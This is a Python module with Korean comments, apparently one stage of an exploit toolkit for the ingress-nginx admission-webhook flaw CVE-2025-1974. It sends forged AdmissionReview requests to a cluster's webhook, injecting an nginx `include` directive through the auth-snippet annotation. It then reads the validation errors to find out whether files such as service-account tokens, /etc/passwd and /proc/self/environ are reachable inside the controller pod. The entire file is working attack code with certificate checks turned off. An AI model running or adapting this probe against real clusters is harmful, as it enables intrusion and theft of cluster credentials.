"""
파일 열거 모듈 — CVE-2025-1974 시나리오 A

auth-snippet에 `include <경로>;` 를 주입하여 nginx -t 검증 중
컨트롤러 파드 내부의 파일에 접근 가능한지 열거한다.
접근 가능 판정: webhook 응답 에러 메시지에 해당 경로 문자열이 포함된 경우.
"""

import json
import ssl
import uuid
import urllib.request
import urllib.error
from dataclasses import dataclass, field


ENUM_PATHS: list[str] = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/net/tcp",
    "/sys/class/net/eth0/address",
    "/proc/self/mountinfo",
    "/etc/hostname",
]


@dataclass
class FileEnumResult:
    path: str
    accessible: bool
    error_message: str = ""
    raw_response: dict = field(default_factory=dict)


def _make_ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _make_admission_review(path: str, namespace: str = "default") -> dict:
    return {
        "apiVersion": "admission.k8s.io/v1",
        "kind": "AdmissionReview",
        "request": {
            "uid": str(uuid.uuid4()),
            "kind": {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
            "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
            "name": "enum-probe",
            "namespace": namespace,
            "operation": "CREATE",
            "userInfo": {"username": "attacker", "groups": ["system:unauthenticated"]},
            "object": {
                "apiVersion": "networking.k8s.io/v1",
                "kind": "Ingress",
                "metadata": {
                    "name": "enum-probe",
                    "namespace": namespace,
                    "annotations": {
                        "nginx.ingress.kubernetes.io/auth-url": "http://127.0.0.1:9999/auth",
                        "nginx.ingress.kubernetes.io/auth-snippet": f"include {path};",
                    },
                },
                "spec": {
                    "ingressClassName": "nginx",
                    "rules": [{
                        "host": "probe.local",
                        "http": {"paths": [{
                            "path": "/",
                            "pathType": "Prefix",
                            "backend": {"service": {"name": "svc", "port": {"number": 80}}},
                        }]},
                    }],
                },
            },
        },
    }


def _send(target: str, payload: dict, ssl_ctx: ssl.SSLContext) -> dict | None:
    url = f"{target}/networking/v1/ingresses"
    req = urllib.request.Request(
        url,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, context=ssl_ctx, timeout=10) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read())
        except Exception:
            return None
    except Exception:
        return None


def _extract_message(resp: dict) -> str:
    if not resp:
        return ""
    return (
        resp.get("response", {}).get("status", {}).get("message")
        or resp.get("response", {}).get("result", {}).get("message")
        or ""
    )


def probe_single_path(
    target: str,
    path: str,
    ssl_ctx: ssl.SSLContext | None = None,
    namespace: str = "default",
) -> FileEnumResult:
    if ssl_ctx is None:
        ssl_ctx = _make_ssl_ctx()

    payload = _make_admission_review(path, namespace)
    resp = _send(target, payload, ssl_ctx)

    if resp is None:
        return FileEnumResult(path=path, accessible=False, error_message="(연결 실패)")

    msg = _extract_message(resp)
    accessible = path in msg

    return FileEnumResult(
        path=path,
        accessible=accessible,
        error_message=msg,
        raw_response=resp,
    )


def enumerate_paths(
    target: str,
    paths: list[str] | None = None,
    *,
    verbose: bool = True,
) -> list[FileEnumResult]:
    if paths is None:
        paths = ENUM_PATHS

    ssl_ctx = _make_ssl_ctx()
    results: list[FileEnumResult] = []

    if verbose:
        print(f"\n  [파일 열거] 대상 {len(paths)}개 경로 탐색 중...")
        print(f"  target: {target}\n")

    for path in paths:
        result = probe_single_path(target, path, ssl_ctx)
        results.append(result)
        if verbose:
            status = "  [접근가능]" if result.accessible else "  [접근불가]"
            print(f"{status} {path}")

    return results


def summarize_enum(results: list[FileEnumResult]) -> dict:
    accessible = [r.path for r in results if r.accessible]
    inaccessible = [r.path for r in results if not r.accessible]
    return {
        "accessible_files": accessible,
        "inaccessible_files": inaccessible,
        "total_probed": len(results),
        "accessible_count": len(accessible),
    }
